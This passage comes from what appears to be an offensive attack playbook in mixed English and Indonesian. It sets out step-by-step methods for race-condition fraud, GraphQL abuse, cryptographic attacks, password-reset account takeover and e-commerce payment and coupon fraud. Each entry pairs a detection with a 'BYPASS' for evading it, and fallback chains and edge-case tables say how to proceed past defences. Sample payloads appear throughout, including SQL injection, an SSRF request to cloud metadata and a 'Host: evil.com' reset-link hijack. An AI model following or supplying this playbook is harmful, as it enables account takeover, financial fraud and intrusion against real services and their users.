   ├── Manipulate order execution sequence
   └── Obtain favorable execution → financial manipulation
   DETECTION: Concurrent order detection, trade sequence anomaly
   BYPASS: Use alternative order manipulation technique

5. BALANCE_RACE
   WHAT: Balance manipulation (deposit/withdraw) via race condition
   HOW:
   ├── Identify balance update endpoint
   ├── Submit concurrent deposit/withdraw requests
   ├── Race condition memungkinkan double-crediting
   ├── Each request reads balance sebelum prev committed
   └── Inflated balance → financial manipulation achieved
   DETECTION: Balance integrity monitoring, concurrent update detection
   BYPASS: Use alternative balance race technique

FALLBACK:
File Race → Symlink Race → Double Spend → Double Submit →
Concurrent Request → Token Reuse → State Confusion → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Race window terlalu kecil         │ 1. Increase concurrency dengan threads
                                  │ 2. Gunakan timing manipulation
                                  │ 3. Fallback ke alternative race method
File locking prevents race        │ 1. Gunakan symlink race instead
                                  │ 2. Bypass lock dengan alternative vector
                                  │ 3. Fallback ke state-based race
Concurrent request throttled      │ 1. Reduce request frequency
                                  │ 2. Use distributed request pattern
                                  │ 3. Fallback ke sequential race technique
Token invalidation race detected  │ 1. Use shorter race window
                                  │ 2. Submit requests lebih cepat
                                  │ 3. Fallback ke alternative token abuse
Balance check enforces atomicity  │ 1. Coba partial amount exploit
                                  │ 2. Use alternative financial race
                                  │ 3. Fallback ke state manipulation
```

---

### 31.4 GraphQL Deep Attacks

```
GRAPHQL_ATTACKS (8):

1. BATCHING_ATTACK
   WHAT: Query batching to bypass rate limit
   HOW:
   ├── Compile multiple queries into single HTTP request
   ├── Use array syntax: [{query1},{query2},...]
   ├── Server executes all queries in one batch
   ├── Rate limit counter only increments once
   └── Extract data from all query responses
   DETECTION: Batch query size monitoring and anomaly detection
   BYPASS: Use aliased single-query approach

2. DEPTH_ABUSE
   WHAT: Deep nested query DoS
   HOW:
   ├── Craft query with deep nested object references
   ├── Example: { user { friends { friends { friends {...}}}}
   ├── Server recursively resolves each nesting level
   ├── CPU and memory exhaustion on resolver layer
   └── Denial of service achieved
   DETECTION: Query depth limit enforcement and monitoring
   BYPASS: Use fragment spread to obscure depth

3. ALIAS_ATTACK
   WHAT: Alias-based query batching
   HOW:
   ├── Use GraphQL aliases to rename identical queries
   ├── Example: q1: user(id:1), q2: user(id:2), ...
   ├── All aliases resolve in single request
   ├── Bypass rate limiting yang berbasis query count
   └── Execute multiple unauthorized lookups
   DETECTION: Alias count monitoring per request
   BYPASS: Use persisted query with multiple aliases

4. INTROSPECTION_LEAK
   WHAT: Introspection query data leak
   HOW:
   ├── Send __schema introspection query
   ├── Extract complete type system definition
   ├── Map all types, fields, arguments, and enums
   ├── Identify hidden or internal-only fields
   └── Use schema knowledge untuk targeted attacks
   DETECTION: Introspection query logging and blocking
   BYPASS: Use field suggestion error messages

5. FIELD_DUPLICATION
   WHAT: Field duplication attack
   HOW:
   ├── Duplicate expensive fields in single query
   ├── Example: { user { name name name ... } }
   ├── Each duplicate triggers separate resolver call
   ├── Backend hits database repeatedly per field
   └── Performance degradation achieved
   DETECTION: Duplicate field detection in query parser
   BYPASS: Use fragment to spread duplicated fields

6. DIRECTIVE_INJECT
   WHAT: Directive injection
   HOW:
   ├── Inject custom or deprecation directives
   ├── Example: @deprecated(reason: "payload")
   ├── Exploit directive handling in resolvers
   ├── Bypass access control checks yang berbasis directive
   └── Manipulate response via directive behavior
   DETECTION: Directive whitelist validation
   BYPASS: Use standard directives dengan modified args

7. UNION_ABUSE
   WHAT: Union type confusion
   HOW:
   ├── Query union type with multiple possible types
   ├── Force server ke resolve unexpected type
   ├── Extract type information dari error responses
   ├── Pivot ke type-specific field access
   └── Access data dari unintended type branch
   DETECTION: Union type resolution logging
   BYPASS: Use fragment on specific union member

8. FRAGMENT_SPREAD
   WHAT: Fragment spread DoS
   HOW:
   ├── Create circular fragment references
   ├── Example: fragment A on User { ...B } fragment B on User { ...A }
   ├── Server enters infinite fragment resolution loop
   ├── CPU exhaustion on query compilation
   └── Denial of service on GraphQL endpoint
   DETECTION: Circular fragment detection in parser
   BYPASS: Use recursive inline fragments

GRAPHQL_EXPLOIT (6):

1. AUTHZ_BYPASS
   WHAT: Authorization bypass via introspection
   HOW:
   ├── Perform introspection to discover hidden queries
   ├── Find admin-only fields exposed in schema
   ├── Execute query langsung tanpa auth context
   ├── Resolvers miss authorization check on hidden fields
   └── Access restricted data
   DETECTION: Introspection-based authorization audit
   BYPASS: Use query complexity to obscure intent

2. SQLI_GRAPHQL
   WHAT: SQL injection via GraphQL arguments
   HOW:
   ├── Identify string arguments in GraphQL query
   ├── Inject SQL payload dalam argument value
   ├── Example: user(name: "admin' OR '1'='1")
   ├── Resolver passes argument ke database query
   └── Extract data via UNION or blind injection
   DETECTION: Parameterized query enforcement
   BYPASS: Use time-based blind injection

3. SSRF_GRAPHQL
   WHAT: SSRF via GraphQL resolvers
   HOW:
   ├── Find resolvers that fetch external URLs
   ├── Inject internal network addresses in URL args
   ├── Example: fetchImage(url: "http://169.254.169.254/latest/meta-data/")
   ├── Resolver makes request ke internal service
   └── Extract cloud metadata or internal data
   DETECTION: Outbound request filtering and logging
   BYPASS: Use DNS rebinding to bypass URL validation

4. NOSQL_GRAPHQL
   WHAT: NoSQL injection via GraphQL
   HOW:
   ├── Inject MongoDB/NoSQL operators in arguments
   ├── Example: { $gt: "" } atau { $ne: null }
   ├── Resolver passes operator ke NoSQL query
   ├── Bypass authentication or extract all documents
   └── Escalate via NoSQL-specific operators
   DETECTION: NoSQL query sanitization monitoring
   BYPASS: Use operator nesting to bypass filters

5. BATCH_AUTHZ_BYPASS
   WHAT: Batch authorization bypass
   HOW:
   ├── Send batch request dengan mixed authorization levels
   ├── Include admin and user queries dalam satu batch
   ├── Server processes batch without per-query auth
   ├── Unauthorized queries execute alongside authorized
   └── Extract data dari privilege mismatch
   DETECTION: Per-query authorization enforcement
   BYPASS: Use nested mutation dalam batch

6. PERSISTED_QUERY
   WHAT: Persisted query abuse
   HOW:
   ├── Register malicious persisted query via automatic persisted query (APQ)
   ├── Store query hash pada server
   ├── Send request using hash reference
   ├── Bypass WAF rules yang inspect query body
   └── Execute hidden query tanpa detection
   DETECTION: Persisted query registry audit
   BYPASS: Use CDN-cached query hash

GRAPHQL_INFRA (4):

1. SCHEMA_DUMP
   WHAT: Full schema extraction
   HOW:
   ├── Execute __schema { types { name fields {...} } }
   ├── Map complete type hierarchy
   ├── Extract all query, mutation, and subscription types
   ├── Build offline attack surface map
   └── Identify deprecated and hidden endpoints
   DETECTION: Schema access logging and rate limiting
   BYPASS: Use partial introspection via error messages

2. TYPE_ENUM
   WHAT: Type enumeration
   HOW:
   ├── Query __type(name: "Target") for specific types
   ├── Enumerate types using known naming patterns
   ├── Extract field names and argument types
   ├── Map relationships antar types
   └── Build complete data model
   DETECTION: Type query frequency monitoring
   BYPASS: Use fragment to enumerate multiple types

3. CONNECTION_ENUM
   WHAT: Connection/resource enumeration
   HOW:
   ├── Query paginated connections: users(first:100, after:"cursor")
   ├── Iterate cursors untuk extract all records
   ├── Identify connection-based access control weaknesses
   ├── Extract ID patterns untuk IDOR attacks
   └── Map entire resource tree
   DETECTION: Pagination query anomaly detection
   BYPASS: Use parallel cursor queries

4. ERROR_LEAK
   WHAT: Error message data leakage
   HOW:
   ├── Send malformed GraphQL queries
   ├── Analyze verbose error responses
   ├── Extract stack traces and resolver names
   ├── Identify backend database type and version
   └── Use error details untuk refine attack
   DETECTION: Error message sanitization
   BYPASS: Use mutation errors untuk data extraction

FALLBACK:
Batching → Depth DoS → Alias → Introspection →
Field Duplication → Directive Inject → Union Abuse → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Introspection disabled globally    │ 1. Use field suggestion errors
                                  │ 2. Fallback ke error-based enumeration
Batch rate limit per-query        │ 1. Split batch into sequential requests
                                  │ 2. Use alias batching instead
Query depth hard-limited at 3     │ 1. Use fragment spread dalam batas
                                  │ 2. Pivot ke introspection-based attack
Persisted query cache purged      │ 1. Re-register via APQ
                                  │ 2. Fallback ke standard query
Resolver returns generic error    │ 1. Use timing-based inference
                                  │ 2. Fallback ke schema enumeration
CORS blocks introspection origin  │ 1. Use server-side request
                                  │ 2. Fallback ke error message extraction
```

---

### 31.5 Cryptographic Attacks

```
PADDING_ORACLE (4):

1. CBC_PADDING
   WHAT: CBC padding oracle
   HOW:
   ├── Intercept ciphertext encrypted with CBC mode
   ├── Modify ciphertext blocks secara terurut
   ├── Send modified ciphertext ke server
   ├── Analyze error response (padding valid vs invalid)
   └── Reconstruct plaintext byte-by-byte
   DETECTION: Padding error response uniformity
   BYPASS: Use timing-based oracle differentiation

2. CBC_MAC_FORGERY
   WHAT: CBC-MAC forgery
   HOW:
   ├── Obtain valid CBC-MAC tag untuk known message
   ├── Compute new message as XOR of messages
   ├── Calculate forged tag using linear property CBC-MAC
   ├── Append forged tag ke crafted message
   └── Server accepts forged message
   DETECTION: CBC-MAC domain separation enforcement
   BYPASS: Use length extension pada variable-length MAC

3. CHOSEN_CIPHERTEXT
   WHAT: Chosen ciphertext attack
   HOW:
   ├── Submit crafted ciphertexts ke decryption oracle
   ├── Analyze decryption results atau error behavior
   ├── Use statistical analysis ke recover key material
   ├── Repeat adaptive queries untuk refine recovery
   └── Recover secret key atau plaintext
   DETECTION: Decryption oracle access rate limiting
   BYPASS: Use offline variant dengan leaked data

4. PT_ORACLE
   WHAT: Plaintext recovery via oracle
   HOW:
   ├── Identify encryption oracle yang leaks plaintext info
   ├── Submit controlled plaintexts
   ├── Observe ciphertext changes
   ├── Correlate changes dengan known plaintext patterns
   └── Recover unknown plaintext via differential analysis
   DETECTION: Oracle response pattern anomaly detection
   BYPASS: Use multiple oracle instances

HASH_ATTACKS (5):

1. LENGTH_EXTENSION
   WHAT: Hash length extension (MD5, SHA-1, SHA-256)
   HOW:
   ├── Obtain hash(message) dan known message length
   ├── Append arbitrary data tanpa knowing secret
   ├── Compute hash(message + padding + appended_data)
   ├── Use Merkle-Damgard construction property
   └── Forge valid MAC untuk extended message
   DETECTION: Use HMAC instead of raw hash
   BYPASS: Use truncated hash variants

2. COLLISION
   WHAT: Hash collision (SHA-1 SHAttered)
   HOW:
   ├── Use precomputed collision pairs (SHAttered)
   ├── Craft two different files dengan same SHA-1 hash
   ├── Submit benign file untuk approval
   ├── Replace dengan malicious file yang collide
   └── Verification passes karena hash identical
   DETECTION: Collision-resistant hash migration
   BYPASS: Use chosen-prefix collision attack

3. PREIMAGE
   WHAT: Preimage attack (weak hash)
   HOW:
   ├── Identify weak hash function (MD5, SHA-1)
   ├── Compute preimage untuk target hash value
   ├── Create input yang produces matching hash
   ├── Submit forged input
   └── Bypass hash-based authentication
   DETECTION: Strong hash algorithm enforcement
   BYPASS: Use rainbow table precomputation

4. RAINBOW_TABLE
   WHAT: Rainbow table attack
   HOW:
   ├── Generate precomputed hash chains untuk password space
   ├── Obtain password hashes dari database leak
   ├── Look up hashes dalam rainbow table
   ├── Recover plaintext passwords
   └── Use recovered credentials untuk access
   DETECTION: Salt enforcement dan hash monitoring
   BYPASS: Use hybrid attack (rainbow + rule-based)

5. HASHCAT_ONLINE
   WHAT: Online hash cracking (hashcat)
   HOW:
   ├── Obtain target hash values
   ├── Configure hashcat dengan rule files dan wordlists
   ├── Run GPU-accelerated brute force atau dictionary attack
   ├── Test candidates against target hashes
   └── Recover plaintext passwords
   DETECTION: Offline hash audit and monitoring
   BYPASS: Use distributed cracking cluster

CRYPTO_ABUSE (7):

1. WEAK_RANDOM
   WHAT: Weak PRNG exploitation (Math.random())
   HOW:
   ├── Identify PRNG usage dalam application
   ├── Collect output samples dari PRNG
   ├── Analyze output distribution untuk predictability
   ├── Predict next random value
   └── Use prediction ke forge tokens atau secrets
   DETECTION: Cryptographic PRNG enforcement
   BYPASS: Use statistical bias exploitation

2. BIAS_RANDOM
   WHAT: Biased random number exploitation
   HOW:
   ├── Collect large sample dari random output
   ├── Perform statistical tests untuk detect bias
   ├── Quantify bias per bit atau per range
   ├── Use bias ke reduce entropy calculation
   └── Predict values dengan higher accuracy
   DETECTION: Randomness quality audit (NIST SP 800-22)
   BYPASS: Use multiple bias sources

3. TIMING_ATTACK
   WHAT: Timing side-channel on crypto
   HOW:
   ├── Send repeated requests ke crypto operation
   ├── Measure response time dengan high precision
   ├── Correlate timing variations dengan secret bits
   ├── Use statistical analysis untuk extract key
   └── Recover secret key via accumulated timing data
   DETECTION: Constant-time implementation verification
   BYPASS: Use cache-based side channel

4. BLEICHENBACHER
   WHAT: Bleichenbacher RSA padding oracle
   HOW:
   ├── Intercept RSA PKCS#1 v1.5 encrypted ciphertext
   ├── Send modified ciphertext ke server
   ├── Analyze error responses (padding valid vs invalid)
   ├── Use adaptive queries ke narrow plaintext range
   └── Recover plaintext tanpa private key
   DETECTION: PKCS#1 v1.5 error response uniformity
   BYPASS: Use hybrid RSA-KEM instead

5. CHOSEN_PLAINTEXT
   WHAT: Chosen plaintext attack
   HOW:
   ├── Submit controlled plaintexts ke encryption oracle
   ├── Obtain corresponding ciphertexts
   ├── Analyze relationship antara plaintext dan ciphertext
   ├── Deduce key schedule atau round keys
   └── Decrypt other ciphertexts
   DETECTION: Encryption oracle access control
   BYPASS: Use related-plaintext variant

6. DOWNGRADE_CRYPTO
   WHAT: Protocol downgrade (SSL 3.0, TLS 1.0)
   HOW:
   ├── Intercept TLS handshake
   ├── Manipulate ClientHello untuk remove modern ciphers
   ├── Force server ke negotiate weaker protocol
   ├── Exploit known vulnerabilities (POODLE, BEAST)
   └── Decrypt traffic
   DETECTION: Protocol version enforcement
   BYPASS: Use graceful degradation exploitation

7. KEY_REUSE
   WHAT: Key/nonce reuse (AES-GCM, ChaCha20)
   HOW:
   ├── Identify nonce reuse dalam AES-GCM traffic
   ├── Collect two ciphertexts encrypted dengan same key+nonce
   ├── XOR ciphertexts untuk obtain plaintext XOR
   ├── Use known plaintext bytes untuk recover unknown
   └── Extract authentication key dari GMAC forgery
   DETECTION: Nonce uniqueness verification
   BYPASS: Use key derivation from leaked nonce

CERT_ABUSE (5):

1. WEAK_CERT
   WHAT: Weak certificate (MD5 signature)
   HOW:
   ├── Identify certificates signed with MD5
   ├── Use collision attack ke create rogue CA cert
   ├── Sign malicious certificate dengan rogue CA
   ├── Browser trusts malicious cert karena chain valid
   └── Intercept HTTPS traffic
   DETECTION: Certificate signature algorithm audit
   BYPASS: Use SHA-1 collision attack

2. SELF_SIGNED_TRUST
   WHAT: Self-signed certificate trust
   HOW:
   ├── Generate self-signed certificate
   ├── Inject CA ke system trust store
   ├── Configure application ke accept custom CA
   ├── Intercept and decrypt TLS traffic
   └── Modify traffic in transit
   DETECTION: Trust store integrity monitoring
   BYPASS: Use certificate transparency bypass

3. CA_MALICIOUS
   WHAT: Malicious CA certificate
   HOW:
   ├── Compromise trusted CA infrastructure
   ├── Issue fraudulent certificate untuk target domain
   ├── Certificate appears valid dalam chain
   ├── Sign malware dengan compromised CA
   └── User system trusts signed malware
   DETECTION: Certificate Transparency log monitoring
   BYPASS: Use private CA compromise

4. CERT_PINNING_BYPASS
   WHAT: Certificate pinning bypass
   HOW:
   ├── Analyze application certificate pinning logic
   ├── Identify pin validation implementation
   ├── Hook pinning function (Frida/Xposed)
   ├── Replace pin check dengan always-true
   └── Install attacker-controlled certificate
   DETECTION: Pinning bypass detection (runtime integrity)
   BYPASS: Use network-level certificate substitution

5. KEY_COMPROMISE
   WHAT: Private key compromise
   HOW:
   ├── Extract private key dari server atau backup
   ├── Use compromised key untuk decrypt traffic
   ├── Sign arbitrary data dengan stolen key
   ├── Impersonate legitimate server
   └── Perform man-in-the-middle attack
   DETECTION: Key usage anomaly detection
   BYPASS: Use key from adjacent service compromise

FALLBACK:
Padding Oracle → Length Extension → Collision →
Rainbow Table → Timing Attack → Bleichenbacher → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Server uses AEAD (AES-GCM)        │ 1. No padding oracle possible
                                  │ 2. Pivot ke nonce reuse atau timing attack
Hash uses salt + strong KDF        │ 1. Rainbow table ineffective
                                  │ 2. Fallback ke online dictionary attack
TLS 1.3 enforced (no downgrade)   │ 1. No protocol downgrade possible
                                  │ 2. Use application-layer crypto weakness
Certificate pinning with backup   │ 1. Primary pin bypassed but backup holds
pin                               │ 2. Use runtime hook ke disable both pins
PBKDF2 with high iteration count  │ 1. Cracking speed significantly reduced
                                  │ 2. Use GPU cluster atau distributed attack
ECDSA nonce biased                │ 1. Lattice attack ke recover private key
                                  │ 2. Use multiple signatures untuk analysis
```

---

### 31.6 Password Reset Vulnerabilities

```
RESET_BYPASS (7):

1. TOKEN_PREDICT
   WHAT: Reset token prediction
   HOW:
   ├── Request password reset untuk target account
   ├── Analyze reset token format dan generation logic
   ├── Identify predictable components (timestamp, counter)
   ├── Predict tokens untuk other accounts
   └── Use predicted token ke reset passwords
   DETECTION: Cryptographically random token enforcement
   BYPASS: Use timing-based token prediction

2. TOKEN_FIXATION
   WHAT: Reset token fixation
   HOW:
   ├── Initiate password reset flow
   ├── Fixate token ke attacker-controlled value
   ├── Send victim link dengan fixed token
   ├── Victim completes reset using attacker token
   └── Attacker uses same token ke reset password
   DETECTION: Token regeneration on each step
   BYPASS: Use pre-authentication token fixation

3. HOST_HEADER_INJECT
   WHAT: Host header injection (password reset)
   HOW:
   ├── Inject attacker-controlled Host header
   ├── Example: Host: evil.com
   ├── Reset link generated dengan injected host
   ├── Victim receives link pointing ke attacker domain
   └── Captures reset token when victim clicks
   DETECTION: Host header validation and whitelisting
   BYPASS: Use X-Forwarded-Host injection

4. EMAIL_INJECTION
   WHAT: Email header injection (reset link)
   HOW:
   ├── Inject newline characters dalam email field
   ├── Add additional recipient headers
   ├── CC/BCC attacker-controlled address
   ├── Reset email sent ke both victim and attacker
   └── Attacker receives reset link alongside victim
   DETECTION: Email field sanitization and validation
   BYPASS: Use email encoding bypass

5. RESPONSE_MANIPULATE
   WHAT: Response manipulation
   HOW:
   ├── Intercept password reset response
   ├── Modify response body atau status code
   ├── Change success response ke reveal token
   ├── Or modify error response ke bypass validation
   └── Complete reset tanpa valid credentials
   DETECTION: Server-side response integrity
   BYPASS: Use client-side state manipulation

6. BRUTEFORCE_TOKEN
   WHAT: Token brute-force
   HOW:
   ├── Request password reset untuk target
   ├── Obtain reset link or token format
   ├── Brute force token space (e.g., 6-digit OTP)
   ├── Submit candidates ke reset endpoint
   └── Find valid token through enumeration
   DETECTION: Token attempt rate limiting
   BYPASS: Use distributed brute force

7. TOKEN_NO_EXPIRE
   WHAT: Token without expiration
   HOW:
   ├── Request password reset
   ├── Obtain reset token
   ├── Wait extended period (days/weeks)
   ├── Use expired-looking token
   └── Server accepts token tanpa expiration check
   DETECTION: Token expiration enforcement
   BYPASS: Use token refresh mechanism abuse

ENUM_ORACLE (4):

1. USER_ENUM_RESET
   WHAT: User enumeration via reset
   HOW:
   ├── Submit password reset untuk existing user
   ├── Submit password reset untuk non-existing user
   ├── Compare response messages or timing
   ├── Existing: "Check your email" vs Non-existing: "User not found"
   └── Enumerate valid usernames from response differences
   DETECTION: Uniform response for all reset requests
   BYPASS: Use response timing differences

2. TIMING_ENUM
   WHAT: Timing-based enumeration
   HOW:
   ├── Send reset request untuk various usernames
   ├── Measure response time precisely
   ├── Existing users: longer processing (email send)
   ├── Non-existing users: shorter processing
   └── Distinguish users dari timing delta
   DETECTION: Constant-time reset response handling
   BYPASS: Use network jitter compensation

3. ERROR_MESSAGE
   WHAT: Error message information leak
   HOW:
   ├── Submit invalid reset request
   ├── Analyze error messages returned
   ├── Extract system information dari verbose errors
   ├── Identify user existence dari specific error codes
   └── Gather intelligence untuk further attacks
   DETECTION: Generic error message enforcement
   BYPASS: Use multi-step error analysis

4. RESPONSE_DIFF
   WHAT: Response difference analysis
   HOW:
   ├── Send reset requests dengan varied parameters
   ├── Compare HTTP status codes, headers, body length
   ├── Identify differences correlating with user state
   ├── Use differences ke enumerate users
   └── Map application behavior patterns
   DETECTION: Response normalization
   BYPASS: Use behavioral fingerprinting

RESET_ABUSE (5):

1. ACCOUNT_TAKEOVER
   WHAT: Account takeover via reset
   HOW:
   ├── Combine user enumeration dengan token prediction
   ├── Obtain valid reset token
   ├── Set new password untuk victim account
   ├── Access account dengan new credentials
   └── Change recovery options untuk persistence
   DETECTION: Reset-to-login anomaly monitoring
   BYPASS: Use social engineering untuk token

2. PASSWORD_CHANGE_HIJACK
   WHAT: Password change hijack
   HOW:
   ├── Intercept active password change session
   ├── Inject request ke change other user password
   ├── Use parameter manipulation (user_id=other)
   ├── Server processes change untuk wrong account
   └── Victim locked out dari own account
   DETECTION: Session-bound password change enforcement
   BYPASS: Use race condition dalam change flow

3. MFA_BYPASS_RESET
   WHAT: MFA bypass via reset
   HOW:
   ├── Use password reset ke bypass MFA requirement
   ├── Reset flow skips MFA verification step
   ├── Set new password directly
   ├── MFA enrollment automatically disabled
   └── Account accessible tanpa second factor
   DETECTION: MFA re-enrollment after reset enforcement
   BYPASS: Use account recovery flow abuse

4. OAUTH_RESET
   WHAT: OAuth token reset abuse
   HOW:
   ├── Identify OAuth provider used for password reset
   ├── Manipulate OAuth redirect URI
   ├── Intercept authorization code
   ├── Exchange code untuk tokens
   └── Use tokens ke complete password reset
   DETECTION: OAuth redirect URI validation
   BYPASS: Use OAuth state parameter manipulation

5. SSO_RESET
   WHAT: SSO session reset abuse
   HOW:
   ├── Identify SSO integration points
   ├── Reset password via external identity provider
   ├── SSO session not invalidated on reset
   ├── Use old session tokens ke access application
   └── Maintain access despite password change
   DETECTION: SSO session invalidation on password change
   BYPASS: Use session token refresh abuse

FALLBACK:
Token Prediction → Token Fixation → Host Header →
Email Injection → Brute-force Token → Direct Reset → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Rate limit active on token brute  │ 1. Pause and use distributed approach
force                             │ 2. Switch ke account enumeration vector
Reset token is cryptographic RNG  │ 1. Token prediction not possible
with entropy                      │ 2. Pivot ke token interception via email
Host header validated by WAF      │ 1. Use X-Forwarded-Host header
                                  │ 2. Fallback ke email header injection
Reset flow requires CAPTCHA       │ 1. Use CAPTCHA solving service
                                  │ 2. Bypass via direct API endpoint
MFA required during reset flow    │ 1. Use SSO session abuse vector
                                  │ 2. Fallback ke OAuth token manipulation
Email provider strips headers     │ 1. Email injection ineffective
                                  │ 2. Use response manipulation instead
```

---

### 31.7 Business Logic Deep

```
LOGIC_BYPASS (7):

1. PRICE_MANIPULATE
   WHAT: Price manipulation via negative quantity or integer overflow
   HOW:
   ├── Intercept product price request via proxy
   ├── Modify quantity parameter ke -1 atau nilai overflow
   ├── Submit manipulated order ke backend
   ├── Backend miscalculate total → negative balance / credit
   └── Withdraw atau exploit resulting credit
   DETECTION: Server-side price validation, negative quantity check
   BYPASS: Use alternate method

2. QUANTITY_BYPASS
   WHAT: Quantity limit bypass untuk bulk purchase restriction
   HOW:
   ├── Identify purchase quantity limit (e.g., max 5 per user)
   ├── Submit multiple parallel requests via thread pool
   ├── Rotate session tokens / use multiple accounts
   ├── Aggregate quantity across split orders
   └── Bypass per-request limit tanpa per-account detection
   DETECTION: Aggregate quantity tracking per user across sessions
   BYPASS: Use alternate method

3. COUPON_ABUSE
   WHAT: Coupon stacking dan exploitation untuk discount accumulation
   HOW:
   ├── Enumerate available coupon codes (brute force / leak)
   ├── Apply multiple coupons secara parallel ke同一 order
   ├── Exploit race condition → apply coupon sebelum validation
   ├── Stack percentage + fixed coupons untuk massive discount
   └── Complete order dengan minimal atau nol payment
   DETECTION: Coupon usage tracking, stacking detection rules
   BYPASS: Use alternate method

4. REFERRAL_ABUSE
   WHAT: Referral program abuse untuk earn unlimited rewards
   HOW:
   ├── Generate valid referral code
   ├── Create multiple dummy accounts menggunakan referral code
   ├── Automate signup + minimal action per dummy account
   ├── Claim referral reward untuk setiap new signup
   └── Aggregate rewards ke main account
   DETECTION: Account clustering detection, IP/device fingerprint analysis
   BYPASS: Use alternate method

5. PROMO_ABUSE
   WHAT: Promotion exploit abuse untuk unauthorized discount
   HOW:
   ├── Identify active promotions (flash sale, happy hour)
   ├── Intercept promotion validation endpoint
   ├── Replay expired promotion tokens atau manipulate expiry
   ├── Apply promotion ke ineligible items
   └── Complete purchase dengan unauthorized promotion
   DETECTION: Promotion lifecycle monitoring, expiry enforcement
   BYPASS: Use alternate method

6. LOYALTY_ABUSE
   WHAT: Loyalty points manipulation untuk unauthorized reward redemption
   HOW:
   ├── Identify loyalty points calculation endpoint
   ├── Manipulate transaction amount → inflates points earned
   ├── Transfer points ke main account via internal transfer
   ├── Exploit points rounding (e.g., 0.49 → 1 point)
   └── Redeem accumulated points untuk high-value rewards
   DETECTION: Points earning anomaly, rounding abuse detection
   BYPASS: Use alternate method

7. GIFTCARD_ABUSE
   WHAT: Gift card exploitation untuk balance theft atau resale
   HOW:
   ├── Enumerate gift card numbers via sequential pattern
   ├── Check balance via balance inquiry endpoint
   ├── Drain balance ke attacker-controlled account
   ├── Exploit return/refund → gift card refund to different card
   └── Resell gift cards atau use for purchases
   DETECTION: Bulk balance inquiry monitoring, abnormal redemption pattern
   BYPASS: Use alternate method

PAYMENT_ABUSE (6):

1. PAYMENT_BYPASS
   WHAT: Payment bypass via race condition pada checkout flow
   HOW:
   ├── Initiate legitimate checkout session
   ├── Submit "confirm order" + "cancel payment" secara parallel
   ├── Race condition → order confirmed tanpa payment completion
   ├── Exploit callback timing → skip payment verification
   └── Receive order tanpa successful payment
   DETECTION: Payment state consistency checks, race condition monitoring
   BYPASS: Use alternate method

2. IDOR_PAYMENT
   WHAT: IDOR pada payment endpoint untuk access unauthorized transactions
   HOW:
   ├── Identify payment endpoint pattern (e.g., /pay/ORDER_ID)
   ├── Enumerate order IDs via sequential guessing
   ├── Access payment page untuk unauthorized order
   ├── Modify payment parameters → redirect ke attacker account
   └── Complete payment untuk order milik victim
   DETECTION: Payment access authorization check, IDOR testing
   BYPASS: Use alternate method

3. CURRENCY_CONFUSION
   WHAT: Currency conversion manipulation untuk price arbitrage
   HOW:
   ├── Identify multi-currency support endpoint
   ├── Switch currency context sebelum payment finalization
   ├── Exploit conversion rate caching lag
   ├── Pay in weaker currency → item listed in stronger currency
   └── Profit dari exchange rate discrepancy
   DETECTION: Currency consistency validation, real-time rate verification
   BYPASS: Use alternate method

4. DISCOUNT_BYPASS
   WHAT: Discount bypass untuk unauthorized price reduction
   HOW:
   ├── Identify discount validation endpoint
   ├── Apply discount code → check server response
   ├── Replay discount application tanpa usage limit enforcement
   ├── Stack multiple discounts secara sequential
   └── Complete purchase dengan compounded discount
   DETECTION: Discount usage tracking, stacking detection
   BYPASS: Use alternate method

5. TAX_EVASION
   WHAT: Tax calculation bypass untuk zero-tax purchase
   HOW:
   ├── Identify tax calculation endpoint
   ├── Manipulate shipping address ke tax-free jurisdiction
   ├── Modify product classification → exempt category
   ├── Override tax calculation via API parameter manipulation
   └── Complete purchase tanpa tax deduction
   DETECTION: Tax calculation audit, address verification cross-check
   BYPASS: Use alternate method

6. REFUND_ABUSE
   WHAT: Refund exploitation untuk unauthorized fund recovery
   HOW:
   ├── Complete legitimate purchase
   ├── Request refund ke original payment method
   ├── Simultaneously use/consume the purchased item
   ├── Exploit refund approval timing → retain item + refund
   └── Repeat across multiple items/accounts
   DETECTION: Refund pattern analysis, item usage tracking
   BYPASS: Use alternate method

FLOW_BYPASS (6):

1. STEP_SKIP
   WHAT: Workflow step skipping untuk bypass validation stage
   HOW:
   ├── Map target workflow steps (e.g., identity → payment → confirm)
   ├── Identify step validation endpoint
   ├── Directly submit final step tanpa completing prerequisites
   ├── Server-side validation weak → step accepted
   └── Workflow completed tanpa mandatory steps
   DETECTION: Step dependency enforcement, workflow state validation
   BYPASS: Use alternate method

2. STATE_MANIPULATE
   WHAT: State machine manipulation untuk force invalid state transitions
   HOW:
   ├── Analyze workflow state machine diagram
   ├── Identify valid transitions (e.g., pending → processing → shipped)
   ├── Submit state change request ke invalid transition
   ├── Exploit missing server-side transition validation
   └── Force workflow ke attacker-controlled state
   DETECTION: State transition whitelist enforcement, anomaly detection
   BYPASS: Use alternate method

3. ORDER_MANIPULATE
   WHAT: Order sequence manipulation untuk priority tampering
   HOW:
   ├── Identify order processing queue
   ├── Submit order dengan manipulated priority parameter
   ├── Exploit queue position logic → elevate order position
   ├── Interleave attacker orders di front of victim orders
   └── Process attacker orders before legitimate ones
   DETECTION: Order queue integrity monitoring, priority anomaly detection
   BYPASS: Use alternate method

4. CART_POISON
   WHAT: Cart manipulation untuk inject unauthorized items
   HOW:
   ├── Access victim's active shopping cart via session
   ├── Modify cart contents (add/remove items)
   ├── Change item quantities → inflate total
   ├── Apply unauthorized discount codes ke victim's cart
   └── Victim proceeds to checkout with tampered cart
   DETECTION: Cart modification audit log, session-based cart protection
   BYPASS: Use alternate method

5. CHECKOUT_BYPASS
   WHAT: Checkout flow bypass untuk complete order tanpa full validation
   HOW:
   ├── Identify checkout steps (address → shipping → payment → confirm)
   ├── Submit direct API call ke order confirmation endpoint
   ├── Bypass mandatory intermediate steps
   ├── Exploit missing middleware validation
   └── Order placed tanpa completing checkout flow
   DETECTION: Checkout step enforcement, API endpoint protection
   BYPASS: Use alternate method

6. VERIFICATION_BYPASS
   WHAT: Verification step bypass untuk skip mandatory checks
   HOW:
   ├── Identify verification requirements (email, phone, KYC)
   ├── Intercept verification response endpoint
   ├── Replay previously successful verification response
   ├── Modify verification status field directly
   └── Account marked as verified tanpa completing verification
   DETECTION: Verification token uniqueness enforcement, replay detection
